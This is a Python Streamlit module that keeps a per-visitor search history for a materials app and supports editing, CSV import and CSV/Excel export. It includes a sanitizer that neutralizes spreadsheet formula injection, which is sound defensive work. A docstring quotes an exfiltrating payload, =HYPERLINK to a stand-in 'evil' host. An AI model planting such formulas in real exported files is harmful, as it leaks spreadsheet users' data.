import streamlit as st
import pandas as pd
import io
from datetime import datetime

from modules.ui import render_empty_state

# Search history used to live in history.db, one SQLite file on the
# server's disk shared by every visitor of this deployment — confirmed
# live: any visitor's search query text (often a real project
# description), recommended material, and cost estimate was written to
# one shared table and shown, exportable, and editable/deletable by
# every OTHER visitor too (including a CSV "Overwrite" import that could
# replace the entire shared history for everyone). Same root cause as
# the settings.json / API-key leaks fixed earlier — a server-side file
# is not private to one visitor, st.session_state is. History now lives
# entirely in st.session_state: private to each visitor, resets when
# they close their browser (the same trade-off already accepted for
# filters/units/mode elsewhere in this app).
_HISTORY_KEY = "search_history_entries"
_NEXT_ID_KEY = "search_history_next_id"
_COLUMNS = ["id", "timestamp", "query", "top_material", "confidence", "est_cost", "volume", "units", "num_results"]

# Leading characters a spreadsheet application (Excel, LibreOffice,
# Google Sheets) interprets as the start of a live formula.
_RISKY_LEADING_CHARS = ("=", "+", "-", "@", "\t", "\r")


def _sanitize_cell(value):
    """Neutralize spreadsheet formula injection (a.k.a. CSV/Excel
    Injection, OWASP-catalogued): text that reaches history through an
    uploaded CSV (import_history_csv) or hand-typed into the data
    editor (save_history_changes) is untrusted, and this app's own
    Export as CSV/Excel buttons will later write it straight back out.
    A value like =HYPERLINK("http://evil/?"&A1,"click") would sit
    inert in this app, but could execute as a real formula the moment
    someone opens that exported file in a spreadsheet program. A
    leading apostrophe is the standard mitigation — spreadsheet apps
    treat it as "force this cell to plain text", so the value still
    displays correctly and never runs as a formula."""
    text = str(value)
    if text and text[0] in _RISKY_LEADING_CHARS:
        return "'" + text
    return text


def init_history():
    if _HISTORY_KEY not in st.session_state:
        st.session_state[_HISTORY_KEY] = []
    if _NEXT_ID_KEY not in st.session_state:
        st.session_state[_NEXT_ID_KEY] = 1


def _next_id():
    nid = st.session_state[_NEXT_ID_KEY]
    st.session_state[_NEXT_ID_KEY] = nid + 1
    return nid


def log_search(query, materials, costs, volume, unit_system, currency_symbol="₹"):
    init_history()
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    short_query = query[:80] + ("..." if len(query) > 80 else "")
    top_mat = materials[0]["MaterialName"] if materials else "N/A"
    conf = f"{materials[0].get('Confidence', 'N/A')}%" if materials else "N/A"
    est_cost = f"{currency_symbol}{costs[0]:.2f}" if costs else "N/A"
    num_res = len(materials)

    st.session_state[_HISTORY_KEY].append({
        "id": _next_id(),
        "timestamp": timestamp,
        "query": short_query,
        "top_material": top_mat,
        "confidence": conf,
        "est_cost": est_cost,
        "volume": volume,
        "units": unit_system,
        "num_results": num_res,
    })


def get_history_df():
    init_history()
    entries = st.session_state[_HISTORY_KEY]
    if not entries:
        return pd.DataFrame(columns=_COLUMNS)
    return pd.DataFrame(entries)[_COLUMNS].sort_values("id", ascending=False).reset_index(drop=True)


def clear_history():
    init_history()
    st.session_state[_HISTORY_KEY] = []


def save_history_changes(edited_df):
    # Matches the prior SQLite version's behavior: every saved row gets
    # a fresh sequential id regardless of whether it existed before
    # (the old INSERT never referenced the id column either), so the
    # ordering on the next read (sort by id desc) reflects save order,
    # not original creation order.
    init_history()
    entries = []
    for _, row in edited_df.iterrows():
        entries.append({
            "id": _next_id(),
            "timestamp": _sanitize_cell(row.get("Timestamp") or datetime.now().strftime("%Y-%m-%d %H:%M:%S")),
            "query": _sanitize_cell(row.get("Query") or "Manual Entry"),
            "top_material": _sanitize_cell(row.get("Top Material") or "N/A"),
            "confidence": _sanitize_cell(row.get("Confidence") or "N/A"),
            "est_cost": _sanitize_cell(row.get("Est. Cost") or "N/A"),
            "volume": float(row.get("Volume") or 0.0),
            "units": _sanitize_cell(row.get("Units") or "Metric"),
            "num_results": int(row.get("# Results") or 0),
        })
    st.session_state[_HISTORY_KEY] = entries


def import_history_csv(df, mode="append"):
    init_history()
    if mode == "overwrite":
        st.session_state[_HISTORY_KEY] = []

    for _, row in df.iterrows():
        st.session_state[_HISTORY_KEY].append({
            "id": _next_id(),
            "timestamp": _sanitize_cell(row.get("Timestamp") or datetime.now().strftime("%Y-%m-%d %H:%M:%S")),
            "query": _sanitize_cell(row.get("Query") or "Imported Entry"),
            "top_material": _sanitize_cell(row.get("Top Material") or "N/A"),
            "confidence": _sanitize_cell(row.get("Confidence") or "N/A"),
            "est_cost": _sanitize_cell(row.get("Est. Cost") or "N/A"),
            "volume": float(row.get("Volume") or 0.0),
            "units": _sanitize_cell(row.get("Units") or "Metric"),
            "num_results": int(row.get("# Results") or 0),
        })


def render_history_table():
    init_history()
    raw_df = get_history_df()

    col_a, col_b = st.columns([3, 1])
    with col_a:
        st.caption("Saved searches. You can edit cells, add rows, or delete rows directly below.")
    with col_b:
        if not raw_df.empty and st.button("Clear all history", use_container_width=True):
            clear_history()
            st.rerun()

    # Always show Import UI first, even if database is empty so users can load their data.
    st.markdown("##### Import History")
    uploaded_file = st.file_uploader("Upload history CSV file", type=["csv"], key="history_uploader")
    if uploaded_file is not None:
        try:
            imported_df = pd.read_csv(uploaded_file)
            required_cols = ["Timestamp", "Query", "Top Material", "Confidence", "Est. Cost", "Volume", "Units", "# Results"]
            missing_cols = [col for col in required_cols if col not in imported_df.columns]

            if not missing_cols:
                imp_col1, imp_col2 = st.columns(2)
                with imp_col1:
                    if st.button("Append to Current History", use_container_width=True):
                        import_history_csv(imported_df, mode="append")
                        st.success("Appended successfully!")
                        st.rerun()
                with imp_col2:
                    if st.button("Overwrite Current History", use_container_width=True):
                        import_history_csv(imported_df, mode="overwrite")
                        st.success("Overwritten successfully!")
                        st.rerun()
            else:
                st.error(f"Missing columns in uploaded CSV: {', '.join(missing_cols)}")
        except Exception as e:
            st.error(f"Failed to parse CSV: {e}")

    st.markdown("---")

    if raw_df.empty:
        render_empty_state(
            "",
            "No search history yet",
            "Run an analysis or import a CSV to populate the log.",
        )
        return

    display_df = raw_df.rename(columns={
        "id": "ID",
        "timestamp": "Timestamp",
        "query": "Query",
        "top_material": "Top Material",
        "confidence": "Confidence",
        "est_cost": "Est. Cost",
        "volume": "Volume",
        "units": "Units",
        "num_results": "# Results"
    })

    # Render interactive data editor
    edited_df = st.data_editor(
        display_df,
        num_rows="dynamic",
        use_container_width=True,
        disabled=["ID"],
        key="history_editor"
    )

    # Save button displays dynamically if changes are made
    if not display_df.equals(edited_df):
        if st.button("Save Changes to Database", type="primary", use_container_width=True):
            try:
                save_history_changes(edited_df)
                st.success("Database successfully updated!")
                st.rerun()
            except Exception as e:
                st.error(f"Could not save changes: {e}")

    col_dl1, col_dl2 = st.columns(2)
    with col_dl1:
        csv_buffer = io.StringIO()
        edited_df.to_csv(csv_buffer, index=False)
        st.download_button(
            "Export as CSV",
            data=csv_buffer.getvalue(),
            file_name="material_search_history.csv",
            mime="text/csv",
            use_container_width=True
        )
    with col_dl2:
        excel_buffer = io.BytesIO()
        edited_df.to_excel(excel_buffer, index=False, engine="openpyxl")
        st.download_button(
            "Export as Excel",
            data=excel_buffer.getvalue(),
            file_name="material_search_history.xlsx",
            mime="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
            use_container_width=True
        )
